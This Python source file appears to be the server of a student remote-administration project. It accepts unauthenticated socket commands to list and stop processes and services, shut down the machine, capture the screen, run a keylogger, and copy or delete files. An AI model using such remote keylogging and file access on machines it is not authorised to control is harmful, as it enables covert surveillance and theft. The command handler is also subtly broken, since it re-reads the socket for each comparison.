import socket
import threading
from Xuly_Chucnang.App_process.SV_app_process import list_apps_running, start_app_by_path, stop_app
from connection import check_ip_address_valid, check_port_open, check_port_valid, open_port
from Xuly_Chucnang.Del_copy.SV_del_copy import copy_file, delete_file
from Xuly_Chucnang.Keylogger.SV_keylogger import start_keylogger
from Xuly_Chucnang.Monitor.SV_monitor import monitor
from Xuly_Chucnang.Services_process.SV_services_process import list_running_services, start_service, stop_service
from Xuly_Chucnang.Shutdown_reset.SV_shutdown_reset import reset_server, shutdown_server
from module_support import receive_response

def main():
    server_ip = socket.gethostbyname(socket.gethostname())
    port = 8080
    if check_port_open(port):
        print(f"\nCổng {port} đã được mở.")
    else:
        # Nếu cổng chưa mở, hỏi người dùng có muốn mở không
        response = input(f"Cổng {port} chưa mở. Bạn có muốn mở cổng {port} không? (y/n): ")
        if response.lower() == 'y':
            open_port(port)
        else:
            print(f"Cổng {port} sẽ không được mở. Thoát chương trình.")
            return
        
    if check_ip_address_valid(server_ip) and check_port_valid(port):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((server_ip, port))
        server_socket.listen(3)  # số lượng kết nối trong 1 thời điểm
        print(f"Server đang lắng nghe tại {server_ip}:{port}")
    else:
        print("IP address hoặc Port không hợp lệ hoặc không mở.")  
    
    try:
        while True:
            # Chấp nhận kết nối từ client
            client_socket, addr = server_socket.accept()
            print(f"Client connected from {addr}")

            # Tạo một thread mới để xử lý client
            client_thread = threading.Thread(target=handle_client, args=(client_socket,))
            client_thread.start()

    except KeyboardInterrupt:
        print("Server is shutting down...")
    finally:
        server_socket.close()
        print("Server stopped.")         
      
def handle_client(client_socket):
    #Xử lý các lệnh từ client.
    try:
        while True:                      
            if not receive_response(client_socket):
                print("Loi ket noi den Client hoac ket noi da dong.")
                break
            print(f"Lenh da nhan: {receive_response(client_socket)}")
           
            # List / Start / Stop các Applications đang chạy SERVER
            if receive_response(client_socket).startswith("LIST_APPS_RUNNING"):
                list_apps_running(client_socket) 
            elif receive_response(client_socket).startswith("START_APP_BY_PATH"):
                app_path = receive_response(client_socket).split(" ",1)[1]
                start_app_by_path(client_socket, app_path)                 
            elif receive_response(client_socket).startswith("STOP_APP"):
                pid = int(receive_response(client_socket).split()[1])
                stop_app(client_socket, pid)
                
            # List / Start / Stop Services (Processes) đang chạy SERVER
            elif receive_response(client_socket).startswith("LIST_SERVICE_RUNNING"):
                list_running_services(client_socket)           
            elif receive_response(client_socket).startswith("START_SERVICE"):
                service_name = receive_response(client_socket).split(" ",1)[1]
                start_service(client_socket, service_name)
            elif receive_response(client_socket).startswith("STOP_SERVICE"):
                service_name = receive_response(client_socket).split(" ",1)[1]
                stop_service(client_socket, service_name) 
            
            # Shutdown / Reset máy SERVER
            elif receive_response(client_socket) == "SHUTDOWN_SERVER":
                shutdown_server(client_socket)
            elif receive_response(client_socket) == "RESET_SERVER":
                reset_server(client_socket)
            
            
            # Xem màn hình hiện thời của máy SERVER
            elif receive_response(client_socket).startswith("SCREEN_CAPTURING"):
                monitor(client_socket)
                
            # Khóa / Bắt phím nhấn (keylogger) ở máy SERVER
            elif receive_response(client_socket).startswith("START_KEY_LOGGER"):
                print("Starting keylogger...")                
                start_keylogger(client_socket)
            elif receive_response(client_socket) == "STOP_KEY_LOGGER":
                print("Keylogger stopped")  
                        
            # Xóa files ; Copy files từ máy SERVER
            elif receive_response(client_socket).startswith("DELETE_FILE"):
                file_path = receive_response(client_socket).split(" ", 1)[1]  # Lấy đường dẫn file từ lệnh
                delete_file(client_socket, file_path)
            elif receive_response(client_socket).startswith("COPY_FILE"):
                file_path = receive_response(client_socket).split(" ", 1)[1]  # Lấy đường dẫn file từ lệnh
                copy_file(client_socket, file_path)
            else:
                print("Khong biet lenh vua nhan tu may Client.")

    except Exception as e:
        print(f"Loi khong mong muon: {e}")
    finally:
        client_socket.close()
        print("Dong ket noi voi may Client.")


if __name__ == "__main__":
    main()